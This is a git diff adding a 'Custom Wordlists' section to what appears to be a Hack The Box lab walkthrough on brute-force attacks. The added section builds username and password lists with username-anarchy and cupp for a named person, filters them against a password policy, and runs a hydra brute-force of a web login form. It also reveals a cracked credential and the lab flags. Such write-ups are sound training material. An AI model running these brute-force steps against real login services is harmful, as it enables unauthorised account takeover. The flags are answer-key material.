@@ -9,6 +9,8 @@
     2. [Login Forms](#login-forms)
 3. [Medusa](#medusa)
     1. [Web Services](#web-services)
+4. [Custom Wordlists](#custom-wordlists)
+    1. [Custom Wordlists](#custom-wordlists-1)
 
 ## Brute Force Attacks
 ### Brute Force Attacks
@@ -153,3 +155,31 @@
     ftp ftp://ftpuser:qqww1122@localhost
     ```
     The answer is `HTB{SSH_and_FTP_Bruteforce_Success}`.
+
+## Custom Wordlists
+### Custom Wordlists
+#### Tools
+1. Username Anarchy
+2. cupp
+#### Challenges
+1. After successfully brute-forcing, and then logging into the target, what is the full flag you find?
+
+    We already have several information, like name, username, birth date, etc. First, we can generate username list by using `username-anarchy`.
+
+    ```bash
+    username-anarchy Jane Smith > jane_smith_usernames.txt
+    ```
+    Then, we can generate possible password by using `cupp`. Here the input data:
+
+    ![alt text](<Assets/Custom Wordlists - 1.png>)
+
+    The company has passwowrd policy. We can filter the password list to get the passwords that meet the requirements.
+    ```bash
+    grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
+    ```
+    After that, we can use hydra to bruteforce.
+
+    ```bash
+    hydra -L jane_smith_usernames.txt -P jane-filtered.txt 83.136.253.5 -s 42961 -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
+    ```
+    We will find the correct credential, `jane:3n4J!!`. The answer is `HTB{W3b_L0gin_Brut3F0rc3_Cu5t0m}`.
